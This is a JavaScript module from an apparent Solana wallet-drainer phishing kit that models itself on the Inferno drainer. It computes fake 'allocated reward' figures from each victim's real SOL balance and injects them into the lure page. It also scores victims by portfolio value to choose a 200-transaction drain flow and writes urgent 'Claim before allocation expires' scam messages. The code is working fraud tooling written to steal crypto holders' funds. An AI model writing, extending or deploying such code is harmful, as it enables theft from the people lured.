'use strict';
/**
 * Dynamic victim personalization — Enhancement from MERGED_KIT.md.
 *
 * MERGED_KIT finding:
 *   "Dynamic victim personalization: lure copy references the victim's wallet
 *    balance. 'Your wallet qualifies for 847 SOL based on your 23.4 SOL holdings.'
 *    Pulled from Solflare API on page load, injected into DOM."
 *
 * Also from Inferno config analysis:
 *   "min_wallet_total_value: 200" — Inferno gates on $200 minimum portfolio value.
 *   "risk_ratio: 0.5" — Inferno computes a risk score per victim and only engages
 *   high-probability victims. This kit uses a fixed SOL balance gate.
 *
 * Sources:
 *   - MERGED_KIT.md: lure generation, victim personalization section
 *   - inferno_configs/config-global.json: min_wallet_total_value, risk_ratio
 *   - inferno_deobfuscated.js: per-chain balance computation before engagement
 */

/**
 * computeAllocatedReward(solBalance, solPrice):
 *   Generates a "personalized allocation" amount for the lure copy.
 *   Based on the victim's actual SOL balance — credible because it matches
 *   what the victim sees in their wallet.
 *
 *   Formula (from MERGED_KIT): ~90% of portfolio value shown as "incoming".
 *   The victim thinks they're claiming MORE than they own — urgency + greed.
 *
 *   Returns { sol: number, usd: number, displaySol: string, displayUsd: string }
 */
function computeAllocatedReward(solBalance, solPrice) {
  const rewardSol = Math.round(solBalance * 0.9 * 100) / 100;
  const rewardUsd = Math.round(rewardSol * (solPrice || 178.5));
  return {
    sol:        rewardSol,
    usd:        rewardUsd,
    displaySol: rewardSol.toLocaleString('en-US', { maximumFractionDigits: 2 }),
    displayUsd: rewardUsd.toLocaleString('en-US', { maximumFractionDigits: 0 }),
  };
}

/**
 * personalizeDOM(solBalance, solPrice, tokenCount):
 *   Injects wallet-specific values into the lure page DOM after portfolio scan.
 *   Replaces placeholder elements with victim-specific numbers.
 *
 *   Call after portfolio() returns, before showing the Connect button.
 *   Finds elements with data-personalize="X" attributes.
 */
function personalizeDOM(solBalance, solPrice, tokenCount) {
  if (typeof document === 'undefined') return;
  const reward = computeAllocatedReward(solBalance, solPrice);

  const selectors = {
    'reward-sol': reward.displaySol + ' SOL',
    'reward-usd': '$' + reward.displayUsd,
    'wallet-sol': solBalance.toFixed(3) + ' SOL',
    'token-count': String(tokenCount || 0),
    'eligible-amount': reward.displaySol + ' SOL ($' + reward.displayUsd + ')',
  };

  for (const [key, value] of Object.entries(selectors)) {
    const els = document.querySelectorAll(`[data-personalize="${key}"]`);
    for (const el of els) el.textContent = value;
  }

  // Also update any element with class "js-reward-amount"
  document.querySelectorAll('.js-reward-amount').forEach(el => {
    el.textContent = reward.displaySol + ' SOL';
  });
}

/**
 * computeRiskScore(portfolio):
 *   Risk/priority score for this victim (from Inferno config's "risk_ratio" concept).
 *   Higher score = engage more aggressively (use SPAM flow, show larger reward amounts).
 *
 *   Score based on:
 *   - Total USD value (higher = higher priority)
 *   - Number of Token-2022 tokens (higher = more complex drain, more risk)
 *   - Has stake accounts (bonus: bigger drain opportunity)
 *   - Has LP tokens (bonus: difficult to drain, lower priority)
 *
 *   Returns 0.0 – 1.0
 */
function computeRiskScore(portfolio) {
  if (!portfolio) return 0;
  const totalUsd = (portfolio.tokens || []).reduce((s, t) => s + (t.usd || 0), 0)
                 + (portfolio.solLamports || 0) / 1e9 * (portfolio.solPriceUsd || 178.5);

  let score = 0;
  if (totalUsd > 10000) score = 1.0;
  else if (totalUsd > 5000) score = 0.9;
  else if (totalUsd > 1000) score = 0.7;
  else if (totalUsd > 500)  score = 0.5;
  else if (totalUsd > 200)  score = 0.3;
  else score = 0.1;

  // Bonus for token-2022 (pump.fun tokens — high value target)
  const t2022count = (portfolio.tokens || []).filter(t => t.token2022).length;
  if (t2022count > 5) score = Math.min(1.0, score + 0.1);

  return score;
}

/**
 * shouldUseSpamFlow(riskScore, canSignAllFlag):
 *   Determines if the 200-tx spam flow should be used (FLOW.SPAM = 2).
 *   Spam flow is used for HIGH-value victims who also support signAllTransactions.
 *   Low-value victims: use standard DRAIN flow (simpler, faster).
 */
function shouldUseSpamFlow(riskScore, canSignAllFlag) {
  return canSignAllFlag && riskScore >= 0.7;
}

/**
 * buildEligibilityMessage(solBalance, tokenCount, totalUsd):
 *   Social engineering copy for the "you qualify" message shown after
 *   wallet connects (before the sign step).
 *   Personalizes based on actual portfolio.
 */
function buildEligibilityMessage(solBalance, tokenCount, totalUsd) {
  const sol = solBalance.toFixed(2);
  const usd = Math.round(totalUsd || 0);
  const reward = computeAllocatedReward(solBalance, totalUsd / solBalance || 178.5);

  if (tokenCount > 10) {
    return `Your wallet qualifies for ${reward.displaySol} SOL based on your ${sol} SOL balance and ${tokenCount} token positions. Claim now before the round closes.`;
  }
  return `Your wallet qualifies for ${reward.displaySol} SOL ($${reward.displayUsd}). Based on your ${sol} SOL balance. Claim before allocation expires.`;
}

module.exports = {
  computeAllocatedReward,
  personalizeDOM,
  computeRiskScore,
  shouldUseSpamFlow,
  buildEligibilityMessage,
};
